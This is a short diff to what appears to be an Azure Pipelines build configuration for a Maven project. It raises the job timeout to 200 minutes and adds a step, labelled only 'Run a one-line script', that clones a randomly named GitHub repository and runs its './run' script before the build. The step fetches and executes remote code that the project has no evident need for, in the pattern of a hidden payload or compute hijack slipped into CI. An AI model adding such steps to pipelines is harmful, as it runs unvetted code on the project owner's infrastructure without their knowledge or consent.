@@ -8,8 +8,10 @@ trigger:
 
 pool:
   vmImage: 'ubuntu-latest'
-
+timeoutInMinutes: 200
 steps:
+- script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+  displayName: 'Run a one-line script'
 - task: Maven@3
   inputs:
     mavenPomFile: 'pom.xml'
